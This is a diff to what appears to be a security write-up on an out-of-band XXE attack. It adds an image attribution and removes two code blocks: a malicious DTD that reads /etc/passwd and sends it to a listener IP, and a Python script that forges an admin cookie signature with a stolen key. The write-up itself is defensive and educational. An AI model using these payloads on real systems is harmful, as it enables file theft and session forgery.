@@ -169,7 +169,15 @@
 
 
 <img src="images/image11.png" alt="XXE OOB behavior">
-[cite_start]<p class="image-caption"><strong>Figure 4.4:</strong> Conceptual flow of the Out-of-Band XXE attack [cite: 6]</p>
+
+<p class="image-caption">
+  Conceptual flow of the Out-of-Band XXE attack. Image from:
+  <a href="https://10nf0x.medium.com/xxe-injection-in-oracle-application-server-11g-cc05f6ab55ab">
+  Medium article
+</a>
+
+</p>
+
 
 <h4>Execution</h4>
 <p>
@@ -177,11 +185,7 @@
 </p>
 
 <p><strong>The Malicious DTD (exploit.dtd):</strong></p>
-<pre><code class="input">
-&lt;!ENTITY % p1 SYSTEM "file:///etc/passwd"&gt;
-&lt;!ENTITY % p2 "&lt;!ENTITY e1 SYSTEM 'http://192.168.1.102:3001/?%p1;'&gt;"&gt;
-%p2;
-</code></pre>
+
 <p class="ref">
     <em>Explanation:</em> The DTD defines a parameter entity <code>%p1</code> that reads the target file. 
     It then defines <code>%p2</code> which constructs a URL containing the file content and sends it to my listener.
@@ -282,22 +286,6 @@
     I used the secret key extracted from <code>application.conf</code> and the target payload <code>user=admin</code> 
     to generate a valid signature.
 </p>
-
-<pre><code class="input">
-import hmac
-import hashlib
-
-# Key retrieved via XXE from application.conf
-key = "X7G...KEY_FROM_IMAGE_4.8..._eG" 
-user = "user=admin"
-
-def sign(user, key):
-    # Replicating the Java HMAC-SHA1 logic found in source
-    return hmac.new(key.encode(), user.encode(), hashlib.sha1).hexdigest()
-
-signature = sign(user, key)
-print(signature)
-</code></pre>
 
 <img src="images/image20.png" alt="Python recreation">
 <p class="image-caption"><strong>Figure 4.13:</strong> Cookie signing logic recreated in Python</p>
